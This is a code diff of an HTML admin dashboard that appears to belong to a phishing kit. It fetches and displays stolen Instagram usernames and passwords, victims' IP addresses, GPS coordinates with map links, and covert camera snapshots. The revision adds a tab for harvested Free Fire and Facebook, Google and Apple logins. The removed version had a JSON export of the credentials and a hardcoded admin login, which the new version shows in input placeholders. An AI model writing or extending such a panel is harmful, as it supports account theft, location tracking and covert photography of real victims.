@@ -2,164 +2,111 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Admin Control Center</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Viewer Panel</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
+        .login-container, .dashboard { max-width: 900px; margin: 0 auto; background: #1e293b; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        .hidden { display: none !important; }
+        input, button { padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; border-radius: 5px; border: 1px solid #475569; background: #334155; color: white; }
+        button { background: #3b82f6; cursor: pointer; font-weight: bold; }
+        button:hover { background: #2563eb; }
+        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tabs button { flex: 1; background: #475569; }
+        .tabs button.active { background: #2563eb; }
+        .card { background: #334155; padding: 15px; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #3b82f6; }
+        .card img { max-width: 150px; border-radius: 5px; margin-top: 10px; }
+    </style>
 </head>
-<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">
+<body>
 
-    <!-- LOGIN SCREEN -->
-    <div id="login-box" class="max-w-md w-full bg-slate-900 border border-slate-800 p-8 rounded-3xl shadow-2xl">
-        <div class="text-center mb-6">
-            <span class="bg-indigo-500/20 text-indigo-400 text-xs font-semibold px-3 py-1 rounded-full uppercase tracking-wider">Restricted Access</span>
-            <h1 class="text-2xl font-bold mt-2 text-white">Admin Authentication</h1>
-            <p class="text-slate-400 text-sm mt-1">Enter credentials to access logs.</p>
-        </div>
-
-        <div class="space-y-4">
-            <div>
-                <label class="block text-xs font-medium text-slate-400 mb-1">Username</label>
-                <input type="text" id="username" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-indigo-500 text-white" placeholder="Enter username">
-            </div>
-            <div>
-                <label class="block text-xs font-medium text-slate-400 mb-1">Password</label>
-                <input type="password" id="password" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-indigo-500 text-white" placeholder="Enter password">
-            </div>
-            <p id="error-msg" class="text-xs text-rose-500 text-center hidden">Invalid Username or Password!</p>
-            <button onclick="checkLogin()" class="w-full bg-indigo-600 hover:bg-indigo-500 font-semibold py-3 rounded-xl transition shadow-lg shadow-indigo-600/20 text-sm">
-                Login to Dashboard
-            </button>
-        </div>
+    <!-- Login Section -->
+    <div id="loginSection" class="login-container">
+        <h2>Admin Login</h2>
+        <input type="text" id="username" placeholder="Username (sumit@1123)">
+        <input type="password" id="password" placeholder="Password (sumit1123)">
+        <button onclick="login()">Login</button>
+        <p id="errorMsg" style="color: #ef4444;"></p>
     </div>
 
-    <!-- DASHBOARD -->
-    <div id="dashboard-box" class="max-w-6xl w-full mx-auto hidden p-4 md:p-8">
-        <div class="flex flex-col md:flex-row justify-between items-center mb-8 bg-slate-900 border border-slate-800 p-6 rounded-2xl gap-4">
-            <div>
-                <h1 class="text-2xl font-bold text-indigo-400">Captured System Logs & Credentials</h1>
-                <p class="text-slate-400 text-xs mt-1">Automatic background data sync active.</p>
-            </div>
-            <div class="flex flex-wrap gap-3">
-                <button onclick="toggleCredentialsView()" id="view-cred-btn" class="bg-pink-600 hover:bg-pink-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition shadow-lg shadow-pink-600/20">View Only Credentials</button>
-                <button onclick="downloadDataJSON()" class="bg-emerald-600 hover:bg-emerald-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition shadow-lg shadow-emerald-600/20">Download JSON</button>
-                <button onclick="loadLogs()" class="bg-indigo-600 hover:bg-indigo-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition">Refresh</button>
-                <button onclick="logout()" class="bg-rose-600/20 text-rose-400 hover:bg-rose-600/30 text-xs font-semibold px-4 py-2.5 rounded-xl transition">Logout</button>
-            </div>
+    <!-- Dashboard Section -->
+    <div id="dashboardSection" class="dashboard hidden">
+        <h2>Collected Logs Dashboard</h2>
+        <div class="tabs">
+            <button id="tabInsta" class="active" onclick="switchTab('insta')">Instagram Logs</button>
+            <button id="tabFF" onclick="switchTab('ff')">Free Fire Data (FB/Google/Apple)</button>
         </div>
-
-        <div id="logs-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+        <div id="dataContainer">Loading data...</div>
     </div>
 
     <script>
-        const ADMIN_USER = "sumit@1123";
-        const ADMIN_PASS = "sumit1123";
-        let globalLogsData = {};
-        let onlyCredentialsMode = false;
+        let currentTab = 'insta';
 
-        function checkLogin() {
-            const user = document.getElementById("username").value;
-            const pass = document.getElementById("password").value;
-            const errorMsg = document.getElementById("error-msg");
+        function login() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
 
-            if (user === ADMIN_USER && pass === ADMIN_PASS) {
-                document.getElementById("login-box").classList.add("hidden");
-                document.getElementById("dashboard-box").classList.remove("hidden");
-                loadLogs();
-            } else {
-                errorMsg.classList.remove("hidden");
-            }
-        }
-
-        function logout() {
-            document.getElementById("dashboard-box").classList.add("hidden");
-            document.getElementById("login-box").classList.remove("hidden");
-            document.getElementById("username").value = "";
-            document.getElementById("password").value = "";
-        }
-
-        function toggleCredentialsView() {
-            onlyCredentialsMode = !onlyCredentialsMode;
-            const btn = document.getElementById("view-cred-btn");
-            if (onlyCredentialsMode) {
-                btn.innerText = "Show All Logs";
-                btn.className = "bg-indigo-600 hover:bg-indigo-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition shadow-lg";
-            } else {
-                btn.innerText = "View Only Credentials";
-                btn.className = "bg-pink-600 hover:bg-pink-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition shadow-lg shadow-pink-600/20";
-            }
-            renderLogs(globalLogsData);
-        }
-
-        function loadLogs() {
-            fetch('/api/get-data')
-                .then(res => res.json())
-                .then(data => {
-                    globalLogsData = data;
-                    renderLogs(data);
-                });
-        }
-
-        function renderLogs(data) {
-            const grid = document.getElementById("logs-grid");
-            grid.innerHTML = "";
-
-            let filteredKeys = Object.keys(data).filter(key => {
-                let item = data[key];
-                if (onlyCredentialsMode) {
-                    return item.instagram_username && item.instagram_username !== 'N/A';
+            fetch('/api/admin-login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: u, password: p })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    document.getElementById('loginSection').classList.add('hidden');
+                    document.getElementById('dashboardSection').classList.remove('hidden');
+                    loadData();
+                } else {
+                    document.getElementById('errorMsg').innerText = 'Invalid Username or Password';
                 }
-                return true;
-            });
-
-            if (filteredKeys.length === 0) {
-                grid.innerHTML = "<p class='text-slate-500 col-span-full text-center py-10'>No matching tracking data recorded yet.</p>";
-                return;
-            }
-
-            filteredKeys.forEach(key => {
-                let item = data[key];
-                
-                let card = document.createElement("div");
-                card.className = "bg-slate-900 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between";
-                
-                card.innerHTML = `
-                    <div>
-                        <div class="flex justify-between items-center mb-3">
-                            <span class="text-[10px] bg-indigo-500/20 text-indigo-300 font-mono px-2 py-0.5 rounded">${item.id}</span>
-                            <span class="text-[10px] text-slate-400">${new Date(item.timestamp).toLocaleString()}</span>
-                        </div>
-                        <div class="space-y-1.5 text-xs text-slate-300 mb-3 font-mono bg-slate-950 p-3 rounded-xl border border-slate-800">
-                            <p class="text-pink-400 font-bold mb-1">-- Instagram Credentials --</p>
-                            <p><strong>User:</strong> <span class="text-white select-all bg-slate-900 px-1 py-0.5 rounded">${item.instagram_username}</span></p>
-                            <p><strong>Pass:</strong> <span class="text-white select-all bg-slate-900 px-1 py-0.5 rounded">${item.instagram_password}</span></p>
-                        </div>
-                        <div class="space-y-1.5 text-xs text-slate-300 mb-3 font-mono">
-                            <p><strong>IP:</strong> ${item.ip}</p>
-                            <p><strong>Lat:</strong> ${item.latitude}</p>
-                            <p><strong>Lon:</strong> ${item.longitude}</p>
-                            ${!isNaN(item.latitude) ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Map ↗</a>` : ''}
-                        </div>
-                    </div>
-                    <div>
-                        <p class="text-[10px] text-slate-400 mb-1">Camera Snap</p>
-                        ${item.image_base64 ? `<img src="${item.image_base64}" class="rounded-xl w-full h-36 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-36 rounded-xl flex items-center justify-center text-[10px] text-rose-400 border border-slate-800">None Captured</div>'}
-                    </div>
-                `;
-                grid.appendChild(card);
             });
         }
 
-        function downloadDataJSON() {
-            if (Object.keys(globalLogsData).length === 0) {
-                alert("No data available to download!");
-                return;
+        function switchTab(tab) {
+            currentTab = tab;
+            if(tab === 'insta') {
+                document.getElementById('tabInsta').classList.add('active');
+                document.getElementById('tabFF').classList.remove('active');
+            } else {
+                document.getElementById('tabFF').classList.add('active');
+                document.getElementById('tabInsta').classList.remove('active');
             }
-            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(globalLogsData, null, 4));
-            const downloadAnchor = document.createElement('a');
-            downloadAnchor.setAttribute("href", dataStr);
-            downloadAnchor.setAttribute("download", "instagram_credentials_logs_" + Date.now() + ".json");
-            document.body.appendChild(downloadAnchor);
-            downloadAnchor.click();
-            downloadAnchor.remove();
+            loadData();
+        }
+
+        function loadData() {
+            const endpoint = currentTab === 'insta' ? '/api/get-data' : '/api/get-ff-data';
+            document.getElementById('dataContainer').innerHTML = 'Loading...';
+
+            fetch(endpoint)
+            .then(res => res.json())
+            .then(data => {
+                const container = document.getElementById('dataContainer');
+                container.innerHTML = '';
+                const keys = Object.keys(data);
+
+                if (keys.length === 0) {
+                    container.innerHTML = '<p>No data found.</p>';
+                    return;
+                }
+
+                keys.forEach(key => {
+                    const item = data[key];
+                    const card = document.createElement('div');
+                    card.className = 'card';
+                    card.innerHTML = `
+                        <strong>ID:</strong> ${item.id} <br>
+                        <strong>Platform / User:</strong> ${item.platform || item.instagram_username} <br>
+                        <strong>Password / Info:</strong> ${item.instagram_password} <br>
+                        <strong>IP Address:</strong> ${item.ip} <br>
+                        <strong>Location:</strong> Lat: ${item.latitude}, Lng: ${item.longitude} <br>
+                        <strong>Time:</strong> ${new Date(item.timestamp).toLocaleString()} <br>
+                        ${item.image_base64 ? `<br><img src="${item.image_base64}" alt="Snapshot"/>` : ''}
+                    `;
+                    container.appendChild(card);
+                });
+            });
         }
     </script>
 </body>
